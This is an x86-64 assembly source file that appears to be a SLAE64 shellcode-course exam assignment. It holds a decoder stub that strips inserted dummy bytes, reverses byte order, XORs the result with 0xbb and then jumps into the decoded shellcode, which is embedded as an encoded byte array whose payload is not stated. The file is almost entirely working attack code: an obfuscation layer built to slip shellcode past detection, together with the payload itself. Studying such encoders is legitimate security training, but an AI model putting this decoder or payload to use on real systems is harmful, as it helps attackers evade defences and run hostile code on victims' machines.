

;Exam Assignment 4
;Insertion Decoder
;Decode Shellcode encoded
;by the "Invertion_Insertion_Xor_encoder"
;Christophe G SLAE64 - 1337









global _start


_start:


jmp short Address
                   ; insertion decoder , Insertion Decode  replace byte of the shellcode correctly ("remove" inserted dummy bytes);
                   ;don' t forget all bytes is inversed the "dummy bytes" is in first after this loop


            InsertionDecoder:
                 pop rsi
                 xor rbx , rbx
                 xor rcx , rcx
                 lea rdi , [rsi + 1]
                 mov r9 , rsi                                ; store for RDI later

            InsertionDecode:
                 cmp byte [rdi + rax + 1] , 0xff             ; marker byte
                 jz Invdecoder
                 mov bl , byte [rdi + rax]
                 mov byte [rsi] , bl
                 add al , 0x2
                 inc rsi
                 jmp InsertionDecode


                  ; invertion decoder/decode replace the shellcode bytes correctly , dummy bytes go to the end

            Invdecoder:
                 mov rdi , r9
                 xor rbx , rbx
                 mov bl , 0x3b                              ;     len of the shellcode - 1
                 mov cl , 0x1e                              ;     len of shellcode / 2 ,  lower round example if len of the shellcode == 61 , 61 / 2 = 30.5 -->
                                                            ;round to 30 == 0x1e if not correctly set this value
							    ;decodeur don't work (marker byte <<0xff>> issue , take a marker byte and move it in beginning)
                 xor rdx , rdx


            Invdecode:
                  mov dl , byte [rdi]
                  mov al , byte [rdi + rbx]
                  mov byte [rdi] , al
                  mov byte [rdi + rbx] ,  dl
                  dec bl
                  dec bl                        ; dec rbx 2 times don' t forget is a offset , if decreasing 1 time rbx "don' t move" because rdi is increasing
                  inc rdi
               loop Invdecode

            ;Xordecoder / xordecode ; unxor shellcode bytes with 0xbb


            Xordecoder:
                  mov rdi , r9
                  add cl , 0x3c

            Xordecode:
                  xor byte[rdi] , 0xbb
                  inc rdi
                  loop Xordecode

               call r9                ; pass control to shellcode



         Address:
            call InsertionDecoder
                           shellcode : db 0x39,0xf8,0x35,0xf8,0xeb,0xf8,0xbb,0xf8,0x68,0xf8,0xd1,0xf8,0xd2,0xf8,0x4d,0xf8,0xc0\
                           ,0xf9,0xd7,0xf9,0x41,0xf9,0x44,0xf9,0x52,0xf9,0x11,0xf9,0xe6,0xf9,0xac,0xf9,0xd3,0xfa,0x75,0xd3,0x5b\
                           ,0xc8,0xca,0x94,0x6d,0xd5,0x7a,0xd2,0x82,0xd9,0x26,0x94,0xfe,0x44,0xb9,0x44,0x72,0x44,0x30,0x65,0x5c\
                           ,0x53,0x97,0xbe,0xb7,0xb4,0xdb,0x80,0x25,0x7b,0xb6,0x38,0xc7,0xf3,0x10,0xab,0xbc,0xec,0xc4,0x36,0xc5\
                           ,0xf3,0x6b,0xb3,0xe0,0xcc,0x2a,0x36,0xd1,0xf3,0x0d,0xab,0xc5,0xfc,0xda,0x32,0x2c,0xf3,0xf0,0xb3,0xc7\
                           ,0xc4,0x85,0x32,0xb6,0xf3,0xaa,0xbc,0x99,0xdc,0x9a,0x33,0xce,0xe4,0x67,0x7b,0xf0,0x8a,0x10,0xf3,0xfe\
                           ,0xa6,0xd6,0x50,0x2b,0xff,0xff
